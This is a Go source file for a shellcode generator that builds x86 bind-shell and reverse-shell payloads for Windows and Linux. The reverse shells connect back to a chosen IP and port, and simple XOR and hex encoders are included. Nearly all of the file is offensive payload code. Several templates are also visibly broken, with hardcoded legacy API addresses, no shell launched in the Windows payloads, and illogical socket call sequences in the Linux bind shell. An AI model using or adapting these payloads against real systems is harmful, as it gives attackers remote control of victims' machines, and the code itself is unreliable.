package shellcodes

import (
	"bytes"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"net"
	"strconv"
)

type ShellGenerator struct {
	osTarget       OS
	osArch         Arch
	shellcodesPath string
}

func NewShellGenerator(osTarget OS, osArch Arch, shellcodesPath string) *ShellGenerator {
	return &ShellGenerator{
		osTarget:       osTarget,
		osArch:         osArch,
		shellcodesPath: shellcodesPath,
	}
}

func (sg *ShellGenerator) Generate(
	shellcodeType ShellcodeType,
	connectbackIP string,
	connectbackPort int,
	encoding string,
) ([]byte, error) {
	var shellcode []byte
	var err error

	switch shellcodeType {
	case Bind:
		shellcode, err = sg.generateBindShellcode(connectbackPort)
	case Reverse:
		shellcode, err = sg.generateReverseShellcode(connectbackIP, connectbackPort)
	default:
		return nil, fmt.Errorf("unsupported shellcode type: %s", shellcodeType)
	}

	if err != nil {
		return nil, err
	}

	if encoding != "" {
		shellcode, err = sg.applyEncoding(shellcode, encoding)
		if err != nil {
			return nil, err
		}
	}

	return shellcode, nil
}

func (sg *ShellGenerator) generateBindShellcode(port int) ([]byte, error) {
	if port < 0 || port > 65535 {
		return nil, fmt.Errorf("invalid port: %d", port)
	}

	switch sg.osTarget {
	case Windows:
		return sg.generateWindowsBindShellcode(port)
	case Linux:
		return sg.generateLinuxBindShellcode(port)
	default:
		return nil, fmt.Errorf("unsupported OS: %s", sg.osTarget)
	}
}

func (sg *ShellGenerator) generateReverseShellcode(ip string, port int) ([]byte, error) {
	if net.ParseIP(ip) == nil {
		return nil, fmt.Errorf("invalid IP address: %s", ip)
	}

	if port < 0 || port > 65535 {
		return nil, fmt.Errorf("invalid port: %d", port)
	}

	switch sg.osTarget {
	case Windows:
		return sg.generateWindowsReverseShellcode(ip, port)
	case Linux:
		return sg.generateLinuxReverseShellcode(ip, port)
	default:
		return nil, fmt.Errorf("unsupported OS: %s", sg.osTarget)
	}
}

func (sg *ShellGenerator) generateWindowsBindShellcode(port int) ([]byte, error) {
	portBytes := make([]byte, 2)
	binary.BigEndian.PutUint16(portBytes, uint16(port))

	shellcodeTemplate := []byte{
		0x31, 0xC9, // xor ecx, ecx
		0x51,                                         // push ecx
		0x68, portBytes[0], portBytes[1], 0x02, 0x00, // push word 0x0002 (AF_INET) + port
		0x8B, 0xC4, // mov eax, esp
		0x50,       // push eax
		0x6A, 0x01, // push 1
		0x6A, 0x02, // push 2
		0xB8, 0x71, 0xAB, 0x8B, 0x7C, // mov eax, 0x7C8BAB71 (WSASocketA)
		0xFF, 0xD0, // call eax
		0x89, 0xC3, // mov ebx, eax
		0x6A, 0x10, // push 16
		0x53,                         // push ebx
		0xB8, 0x28, 0x74, 0x8B, 0x7C, // mov eax, 0x7C8B7428 (bind)
		0xFF, 0xD0, // call eax
		0x6A, 0x10, // push 16
		0x53,                         // push ebx
		0xB8, 0x14, 0x75, 0x8B, 0x7C, // mov eax, 0x7C8B7514 (listen)
		0xFF, 0xD0, // call eax
		0x6A, 0x10, // push 16
		0x53,                         // push ebx
		0xB8, 0x0C, 0x75, 0x8B, 0x7C, // mov eax, 0x7C8B750C (accept)
		0xFF, 0xD0, // call eax
		0x89, 0xC3, // mov ebx, eax
	}

	return shellcodeTemplate, nil
}

func (sg *ShellGenerator) generateWindowsReverseShellcode(ip string, port int) ([]byte, error) {
	ipBytes := net.ParseIP(ip).To4()
	if ipBytes == nil {
		return nil, fmt.Errorf("invalid IPv4 address")
	}

	portBytes := make([]byte, 2)
	binary.BigEndian.PutUint16(portBytes, uint16(port))

	shellcodeTemplate := []byte{
		0x31, 0xC9, // xor ecx, ecx
		0x51,                                                 // push ecx
		0x68, ipBytes[0], ipBytes[1], ipBytes[2], ipBytes[3], // push IP
		0x68, portBytes[0], portBytes[1], 0x02, 0x00, // push word 0x0002 (AF_INET) + port
		0x8B, 0xC4, // mov eax, esp
		0x50,       // push eax
		0x6A, 0x01, // push 1
		0x6A, 0x02, // push 2
		0xB8, 0x71, 0xAB, 0x8B, 0x7C, // mov eax, 0x7C8BAB71 (WSASocketA)
		0xFF, 0xD0, // call eax
		0x89, 0xC3, // mov ebx, eax
		0x6A, 0x10, // push 16
		0x53,                         // push ebx
		0xB8, 0x10, 0x74, 0x8B, 0x7C, // mov eax, 0x7C8B7410 (connect)
		0xFF, 0xD0, // call eax
	}

	return shellcodeTemplate, nil
}

func (sg *ShellGenerator) generateLinuxBindShellcode(port int) ([]byte, error) {
	portBytes := make([]byte, 2)
	binary.BigEndian.PutUint16(portBytes, uint16(port))

	shellcodeTemplate := []byte{
		0x31, 0xDB, // xor ebx, ebx
		0x53,       // push ebx
		0x43,       // inc ebx
		0x53,       // push ebx
		0x6A, 0x02, // push 2
		0x89, 0xE1, // mov ecx, esp
		0xB0, 0x66, // mov al, 102 (socketcall)
		0xCD, 0x80, // int 0x80
		0x89, 0xC3, // mov ebx, eax
		0x31, 0xC9, // xor ecx, ecx
		0x51,                                         // push ecx
		0x68, portBytes[0], portBytes[1], 0x02, 0x00, // push port
		0x66, 0x68, 0x00, 0x00, // push word 0x0000
		0x66, 0x53, // push bx
		0x89, 0xE1, // mov ecx, esp
		0x6A, 0x10, // push 16
		0x51,       // push ecx
		0x53,       // push ebx
		0x89, 0xE1, // mov ecx, esp
		0xB0, 0x66, // mov al, 102
		0xCD, 0x80, // int 0x80
		0x31, 0xDB, // xor ebx, ebx
		0x39, 0xC3, // cmp eax, ebx
		0x74, 0x05, // jz +5
		0x31, 0xC0, // xor eax, eax
		0x40,       // inc eax
		0xCD, 0x80, // int 0x80
		0x31, 0xC9, // xor ecx, ecx
		0x51,                         // push ecx
		0x68, 0x02, 0x00, 0x0F, 0x7F, // push 0x7F000002 (127.0.0.1)
		0x89, 0xE1, // mov ecx, esp
		0xB0, 0x66, // mov al, 102
		0x6A, 0x03, // push 3
		0x58,       // pop eax
		0x50,       // push eax
		0x53,       // push ebx
		0x89, 0xE1, // mov ecx, esp
		0xCD, 0x80, // int 0x80
		0x31, 0xDB, // xor ebx, ebx
		0x39, 0xC3, // cmp eax, ebx
		0x74, 0x05, // jz +5
		0x31, 0xC0, // inc eax
		0x40,       // inc eax
		0xCD, 0x80, // int 0x80
		0x31, 0xC9, // xor ecx, ecx
		0x51,       // push ecx
		0x51,       // push ecx
		0x51,       // push ecx
		0x51,       // push ecx
		0x51,       // push ecx
		0x89, 0xE1, // mov ecx, esp
		0xB0, 0x66, // mov al, 102
		0x6A, 0x04, // push 4
		0x58,       // pop eax
		0x50,       // push eax
		0x53,       // push ebx
		0x89, 0xE1, // mov ecx, esp
		0xCD, 0x80, // int 0x80
		0x31, 0xC9, // xor ecx, ecx
		0x51,       // push ecx
		0x89, 0xE1, // mov ecx, esp
		0xB0, 0x66, // mov al, 102
		0x6A, 0x05, // push 5
		0x58,       // pop eax
		0x50,       // push eax
		0x53,       // push ebx
		0x89, 0xE1, // mov ecx, esp
		0xCD, 0x80, // int 0x80
		0x89, 0xC3, // mov ebx, eax
		0x31, 0xC9, // xor ecx, ecx
		0x51,       // push ecx
		0x51,       // push ecx
		0x51,       // push ecx
		0x51,       // push ecx
		0x51,       // push ecx
		0x89, 0xE1, // mov ecx, esp
		0xB0, 0x66, // mov al, 102
		0x6A, 0x03, // push 3
		0x58,       // pop eax
		0x50,       // push eax
		0x53,       // push ebx
		0x89, 0xE1, // mov ecx, esp
		0xCD, 0x80, // int 0x80
		0x31, 0xC9, // xor ecx, ecx
		0x51,       // push ecx
		0x89, 0xE1, // mov ecx, esp
		0xB0, 0x66, // mov al, 102
		0x6A, 0x05, // push 5
		0x58,       // pop eax
		0x50,       // push eax
		0x53,       // push ebx
		0x89, 0xE1, // mov ecx, esp
		0xCD, 0x80, // int 0x80
		0x31, 0xC9, // xor ecx, ecx
		0x51,       // push ecx
		0x89, 0xE1, // mov ecx, esp
		0xB0, 0x3F, // mov al, 63 (dup2)
		0xCD, 0x80, // int 0x80
		0x41,             // inc ecx
		0x80, 0xF9, 0x03, // cmp cl, 3
		0x75, 0xF6, // jnz -10
		0x31, 0xC0, // xor eax, eax
		0x52,                         // push edx
		0x68, 0x2F, 0x2F, 0x73, 0x68, // push "//sh"
		0x68, 0x2F, 0x62, 0x69, 0x6E, // push "/bin"
		0x89, 0xE3, // mov ebx, esp
		0x52,       // push edx
		0x53,       // push ebx
		0x89, 0xE1, // mov ecx, esp
		0xB0, 0x0B, // mov al, 11 (execve)
		0xCD, 0x80, // int 0x80
	}

	return shellcodeTemplate, nil
}

func (sg *ShellGenerator) generateLinuxReverseShellcode(ip string, port int) ([]byte, error) {
	ipBytes := net.ParseIP(ip).To4()
	if ipBytes == nil {
		return nil, fmt.Errorf("invalid IPv4 address")
	}

	portBytes := make([]byte, 2)
	binary.BigEndian.PutUint16(portBytes, uint16(port))

	shellcodeTemplate := []byte{
		0x31, 0xDB, // xor ebx, ebx
		0x53,       // push ebx
		0x43,       // inc ebx
		0x53,       // push ebx
		0x6A, 0x02, // push 2
		0x89, 0xE1, // mov ecx, esp
		0xB0, 0x66, // mov al, 102 (socketcall)
		0xCD, 0x80, // int 0x80
		0x89, 0xC3, // mov ebx, eax
		0x31, 0xC9, // xor ecx, ecx
		0x51,                                                 // push ecx
		0x68, ipBytes[0], ipBytes[1], ipBytes[2], ipBytes[3], // push IP
		0x66, 0x68, portBytes[0], portBytes[1], // push port
		0x66, 0x6A, 0x02, // push word 2
		0x89, 0xE1, // mov ecx, esp
		0x6A, 0x10, // push 16
		0x51,       // push ecx
		0x53,       // push ebx
		0x89, 0xE1, // mov ecx, esp
		0xB0, 0x66, // mov al, 102
		0x6A, 0x03, // push 3
		0x58,       // pop eax
		0x50,       // push eax
		0x53,       // push ebx
		0x89, 0xE1, // mov ecx, esp
		0xCD, 0x80, // int 0x80
		0x31, 0xDB, // xor ebx, ebx
		0x39, 0xC3, // cmp eax, ebx
		0x74, 0x05, // jz +5
		0x31, 0xC0, // xor eax, eax
		0x40,       // inc eax
		0xCD, 0x80, // int 0x80
		0x31, 0xC9, // xor ecx, ecx
		0x51,       // push ecx
		0x51,       // push ecx
		0x51,       // push ecx
		0x51,       // push ecx
		0x51,       // push ecx
		0x89, 0xE1, // mov ecx, esp
		0xB0, 0x66, // mov al, 102
		0x6A, 0x04, // push 4
		0x58,       // pop eax
		0x50,       // push eax
		0x53,       // push ebx
		0x89, 0xE1, // mov ecx, esp
		0xCD, 0x80, // int 0x80
		0x31, 0xC9, // xor ecx, ecx
		0x51,       // push ecx
		0x89, 0xE1, // mov ecx, esp
		0xB0, 0x66, // mov al, 102
		0x6A, 0x05, // push 5
		0x58,       // pop eax
		0x50,       // push eax
		0x53,       // push ebx
		0x89, 0xE1, // mov ecx, esp
		0xCD, 0x80, // int 0x80
		0x89, 0xC3, // mov ebx, eax
		0x31, 0xC9, // xor ecx, ecx
		0x51,       // push ecx
		0x51,       // push ecx
		0x51,       // push ecx
		0x51,       // push ecx
		0x51,       // push ecx
		0x89, 0xE1, // mov ecx, esp
		0xB0, 0x66, // mov al, 102
		0x6A, 0x03, // push 3
		0x58,       // pop eax
		0x50,       // push eax
		0x53,       // push ebx
		0x89, 0xE1, // mov ecx, esp
		0xCD, 0x80, // int 0x80
		0x31, 0xC9, // xor ecx, ecx
		0x51,       // push ecx
		0x89, 0xE1, // mov ecx, esp
		0xB0, 0x3F, // mov al, 63 (dup2)
		0xCD, 0x80, // int 0x80
		0x41,             // inc ecx
		0x80, 0xF9, 0x03, // cmp cl, 3
		0x75, 0xF6, // jnz -10
		0x31, 0xC0, // xor eax, eax
		0x52,                         // push edx
		0x68, 0x2F, 0x2F, 0x73, 0x68, // push "//sh"
		0x68, 0x2F, 0x62, 0x69, 0x6E, // push "/bin"
		0x89, 0xE3, // mov ebx, esp
		0x52,       // push edx
		0x53,       // push ebx
		0x89, 0xE1, // mov ecx, esp
		0xB0, 0x0B, // mov al, 11 (execve)
		0xCD, 0x80, // int 0x80
	}

	return shellcodeTemplate, nil
}

func (sg *ShellGenerator) applyEncoding(shellcode []byte, encoding string) ([]byte, error) {
	switch encoding {
	case "xor":
		return sg.applyXOREncoding(shellcode, 0xAA)
	case "alphanum":
		return sg.applyAlphanumericEncoding(shellcode)
	case "hex":
		return []byte(hex.EncodeToString(shellcode)), nil
	default:
		return shellcode, nil
	}
}

func (sg *ShellGenerator) applyXOREncoding(shellcode []byte, key byte) ([]byte, error) {
	encoded := make([]byte, len(shellcode))
	for i := range shellcode {
		encoded[i] = shellcode[i] ^ key
	}
	return encoded, nil
}

func (sg *ShellGenerator) applyAlphanumericEncoding(shellcode []byte) ([]byte, error) {
	var buf bytes.Buffer

	for _, b := range shellcode {
		buf.WriteString(fmt.Sprintf("\\x%02x", b))
	}

	return []byte(buf.String()), nil
}

func portToHex(port int) string {
	return fmt.Sprintf("%04X", port)
}

func ipToHex(ip string) string {
	parts := bytes.Split([]byte(ip), []byte("."))
	var result string
	for _, part := range parts {
		val, _ := strconv.Atoi(string(part))
		result += fmt.Sprintf("%02X", val)
	}
	return result
}
